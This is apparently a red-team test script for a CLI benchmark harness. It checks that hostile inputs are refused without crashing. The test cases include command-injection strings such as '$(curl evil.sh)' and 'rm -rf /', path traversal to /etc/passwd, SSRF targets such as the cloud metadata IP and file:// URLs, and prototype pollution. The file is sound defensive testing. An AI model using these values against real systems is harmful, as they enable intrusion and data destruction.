// v0.45.0 RED TEAM PASS (war-room Play 4) — try to break the benchmark before
// it ships: dimension-list injection, junk roots, junk selections, hostile
// reason strings (ANSI/newline/flood), SSRF through citation fetches, lying
// evidence paths, junk brain probes, junk runner results, proto pollution,
// spawn junk. Every attack must be REFUSED HONESTY (honest error, honest
// refusal, honest degradation) and must NEVER crash the harness. A crash, a
// fabricated pass, or evidence accepted from outside the benchmark dir =
// ship blocked.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import {
  parseDimList, fetchCitation, detectFalsePremiseCorrection, scorecardText,
  runBenchmark, runOneShot, watchFirstWrite, DIMENSIONS,
} from '../src/benchmark.js';

const run = promisify(execFile);
const REPO = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..');
const ENTRY = path.join(REPO, 'src', 'index.js');
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'v045-redteam-'));

let pass = 0, fail = 0;
const ok = (cond, name, detail = '') => {
  if (cond) { pass++; console.log(`  ✔ ${name}${detail ? ` → ${detail}` : ''}`); }
  else { fail++; console.log(`  ✖ ${name}${detail ? ` → ${detail}` : ''}`); }
};
const HONEST = /^(\(?(ERROR|error)\b|refused|unknown|benchmark root|not a directory|spawn failed|benchmark failed honestly|buddy: |nothing|no |skipped|unable|cannot)/i;

const attacks = [
  // ── the --dim list is data, never a command ────────────────────────────────
  ['dim list injection (;)', () => parseDimList('research;shutdown now').error ?? 'NO ERROR'],
  ['dim list injection ($())', () => parseDimList('$(curl evil.sh)').error ?? 'NO ERROR'],
  ['dim list traversal (../)', () => parseDimList('../../etc/passwd').error ?? 'NO ERROR'],
  ['dim list 10k flood', () => parseDimList('a'.repeat(10000)).error ?? 'NO ERROR'],
  ['dim list newline smuggle', () => parseDimList('research\n--fast --yolo').error ?? 'NO ERROR'],
  ['dim list unicode lookalike', () => parseDimList('геsеаrсh').error ?? 'NO ERROR'],
  // ── junk roots and junk selections (direct API) ───────────────────────────
  ['runBenchmark root null', async () => { try { await runBenchmark({ root: null }); return 'NO ERROR — ran!'; } catch (e) { return e.message; } }],
  ['runBenchmark root number', async () => { try { await runBenchmark({ root: 42 }); return 'NO ERROR — ran!'; } catch (e) { return e.message; } }],
  ['runBenchmark root empty string', async () => { try { await runBenchmark({ root: '' }); return 'NO ERROR — ran!'; } catch (e) { return e.message; } }],
  ['runBenchmark root is a file', async () => { const f = path.join(tmp(), 'f'); fs.writeFileSync(f, 'x'); try { await runBenchmark({ root: f }); return 'NO ERROR — ran!'; } catch (e) { return e.message; } }],
  ['runBenchmark dims proto pollution', async () => { try { await runBenchmark({ root: tmp(), dims: ['__proto__'], fast: true }); return 'NO ERROR — ran!'; } catch (e) { return e.message; } }],
  ['runBenchmark dims junk strings', async () => { try { await runBenchmark({ root: tmp(), dims: ['research; rm -rf /', 'constructor'], fast: true }); return 'NO ERROR — ran!'; } catch (e) { return e.message; } }],
  // ── the brain probe is never trusted ──────────────────────────────────────
  ['probeBrain throws', async () => {
    const out = await runBenchmark({ root: tmp(), dims: ['verify'], probeBrain: async () => { throw new Error('boom'); } });
    return out.results[0].status === 'SKIP' && /probe threw/.test(out.results[0].reason) ? `SKIP honest: ${out.results[0].reason.slice(0, 60)}` : `BAD: ${out.results[0].status}`;
  }],
  ['probeBrain returns junk', async () => {
    const out = await runBenchmark({ root: tmp(), dims: ['verify'], probeBrain: async () => ({ ok: 'yes please' }) });
    return out.results[0].status === 'SKIP' && /junk/.test(out.results[0].reason) ? 'SKIP honest (junk probe refused)' : `BAD: ${out.results[0].status} ${out.results[0].reason}`;
  }],
  ['probeBrain returns null', async () => {
    const out = await runBenchmark({ root: tmp(), dims: ['verify'], probeBrain: async () => null });
    return out.results[0].status === 'SKIP' ? 'SKIP honest (null probe refused)' : `BAD: ${out.results[0].status}`;
  }],
  // ── evidence containment: a lying runner cannot plant outside proof ───────
  ['evidence path outside benchDir', async () => {
    const outsider = path.join(tmp(), 'planted.json');
    fs.writeFileSync(outsider, 'planted proof', 'utf8');
    const out = await runBenchmark({
      root: tmp(), dims: ['capabilities', 'evidence'],
      runners: { capabilities: (ctx) => ({ status: 'PASS', reason: 'lying', evidence: [outsider] }) },
    });
    const ev = out.results.find((r) => r.id === 'evidence');
    return ev.status === 'FAIL' && /(no non-empty artifact (on disk )?INSIDE|outside the benchmark dir)/.test(ev.reason) ? 'FAIL honest: planted proof rejected' : `BAD: evidence said ${ev.status} ${ev.reason}`;
  }],
  ['evidence path /etc/hostname', async () => {
    const out = await runBenchmark({
      root: tmp(), dims: ['capabilities', 'evidence'],
      runners: { capabilities: (ctx) => ({ status: 'PASS', reason: 'lying', evidence: ['/etc/hostname'] }) },
    });
    const ev = out.results.find((r) => r.id === 'evidence');
    return ev.status === 'FAIL' ? 'FAIL honest (system file is not benchmark evidence)' : `BAD: evidence said ${ev.status}`;
  }],
  // ── hostile reason strings cannot break the scorecard table ───────────────
  ['scorecard reason ANSI + newline + 5k flood', () => {
    const text = scorecardText(
      [{ id: 'verify', title: 'VERIFY', kind: 'live', status: 'FAIL', reason: '\x1b[31mline1\nline2\x1b[0m' + 'x'.repeat(5000) }],
      { passed: 0, failed: 1, skipped: 0, score: 0, benchDir: '/tmp/b', fast: false, brain: null },
    );
    const row = text.split('\n').find((l) => l.startsWith('verify'));
    return row && row.length < 140 && !text.includes('\x1b[') && text.split('\n').filter((l) => l.startsWith('verify')).length === 1
      ? `row sanitized, ${row.length} chars` : 'BAD: reason broke the table';
  }],
  ['scorecard results junk shapes (null results)', () => {
    const t = scorecardText(null, { passed: 0, failed: 0, skipped: 0, score: null, benchDir: '/tmp/b', fast: false, brain: null });
    return t.includes('score:') && !t.includes('undefined\nundefined') ? 'junk results render honestly, no throw' : 'BAD';
  }],
  // ── the false-premise scorer is data-safe ─────────────────────────────────
  ['verify claimed string is regex metacharacters', () => {
    const r = detectFalsePremiseCorrection('no such .*+?^${}()|[]\\ release here', '.*+?^${}()|[]\\');
    return r.caught === true ? 'caught, no throw' : `BAD: ${JSON.stringify(r)}`;
  }],
  ['verify 100k transcript flood', () => {
    const t0 = Date.now();
    const r = detectFalsePremiseCorrection('there is no 3.2.0 section ' + 'filler '.repeat(20000), '3.2.0');
    return r.caught && Date.now() - t0 < 1000 ? `caught in ${Date.now() - t0}ms` : 'BAD';
  }],
  // ── citation fetch: the harness rides the same SSRF guard ─────────────────
  ['citation file:// scheme', async () => { const r = await fetchCitation('file:///etc/passwd'); return r.ok ? 'BAD: fetched!' : `refused: ${r.reason}`; }],
  ['citation metadata IP', async () => { const r = await fetchCitation('http://169.254.169.254/latest/meta-data/'); return r.ok ? 'BAD: fetched!' : `refused: ${r.reason}`; }],
  ['citation bracketed IPv6', async () => { const r = await fetchCitation('http://[fc00::1]/x'); return r.ok ? 'BAD: fetched!' : `refused: ${r.reason}`; }],
  ['citation localhost', async () => { const r = await fetchCitation('http://localhost:22/x'); return r.ok ? 'BAD: fetched!' : `refused: ${r.reason}`; }],
  // ── spawn junk degrades honestly ──────────────────────────────────────────
  ['runOneShot junk args (null/undefined)', async () => {
    const r = await runOneShot([null, undefined], { timeoutMs: 5000 });
    const spawnRefused = r.code === null && /spawn failed|ERR_INVALID_ARG/.test(r.err);
    const cliRefused = r.code !== 0 && /usage|engineer-buddy/i.test(r.err + r.out);
    return spawnRefused || cliRefused ? 'honest refusal (spawn rejected or CLI usage exit)' : `BAD: ${JSON.stringify(r).slice(0, 100)}`;
  }],
  ['runOneShot junk cwd', async () => {
    const r = await runOneShot(['-p', 'x'], { cwd: '/nonexistent-dir-for-redteam', timeoutMs: 5000 });
    return r.code === null || r.err ? `honest failure surfaced (code ${r.code})` : 'BAD: silent success?';
  }],
  ['watchFirstWrite hostile kill (kill throws)', async () => {
    const hostile = { exitCode: null, signalCode: null, kill() { throw new Error('kill refused'); } };
    const t0 = Date.now();
    const p = watchFirstWrite(tmp(), hostile, { pollMs: 20, timeoutMs: 800 });
    // also corrupt the sessions dir with a hostile file
    fs.mkdirSync(path.join(tmp(), '.buddy', 'sessions'), { recursive: true });
    const w = await p;
    return !w.killed && Date.now() - t0 < 5000 ? `resolved honestly (${w.reason.slice(0, 50)})` : 'BAD';
  }],
  // ── the CLI surface ────────────────────────────────────────────────────────
  ['CLI --dim injection exits 2', async () => {
    try { await run(process.execPath, [ENTRY, 'benchmark', '--dim', 'research;shutdown now'], { timeout: 30000 }); return 'BAD: exit 0'; }
    catch (e) { return e.code === 2 && /unknown dimension/.test(e.stderr) ? 'exit 2 + honest error' : `BAD: code ${e.code}`; }
  }],
  ['CLI --dir at a file exits honestly', async () => {
    const f = path.join(tmp(), 'notadir'); fs.writeFileSync(f, 'x');
    try { await run(process.execPath, [ENTRY, 'benchmark', '--dir', f], { timeout: 30000 }); return 'BAD: exit 0'; }
    catch (e) { return e.code === 2 && /failed honestly|not a directory/.test(e.stderr) ? `exit 2 + ${e.stderr.trim().split('\n').pop().slice(0, 60)}` : `BAD: code ${e.code} ${String(e.stderr).slice(0, 80)}`; }
  }],
  ['CLI benchmark on a non-buddy dir still contained', async () => {
    const root = tmp();
    try { await run(process.execPath, [ENTRY, 'benchmark', '--fast', '--dir', root], { timeout: 60000 }); const dirs = fs.readdirSync(path.join(root, '.buddy', 'benchmark')); return dirs.length === 1 ? 'evidence landed inside the requested root only' : `BAD: ${dirs.length} dirs`; }
    catch (e) { return `BAD: ${String(e.stderr).slice(0, 80)}`; }
  }],
];

console.log('v0.45.0 RED TEAM PASS — the benchmark harness under fire\n');
for (const [name, fn] of attacks) {
  try {
    const detail = await fn();
    ok(!/^(BAD|NO ERROR)/.test(String(detail)), name, String(detail).slice(0, 110));
  } catch (e) {
    ok(false, name, `THREW: ${String(e?.message || e).slice(0, 110)}`);
  }
}

// ── the invariant, attacked one final time ───────────────────────────────────
{
  const out = await runBenchmark({ root: tmp(), fast: true });
  const inv = out.passed + out.failed + out.skipped === DIMENSIONS.length;
  ok(inv, 'scorecard invariant holds under every attack', `passed ${out.passed} + failed ${out.failed} + skipped ${out.skipped} = ${DIMENSIONS.length}`);
}

const total = attacks.length + 1;
console.log(`\nRED TEAM: ${pass}/${total} attacks refused honestly, ${fail} failures`);
process.exit(fail ? 1 : 0);
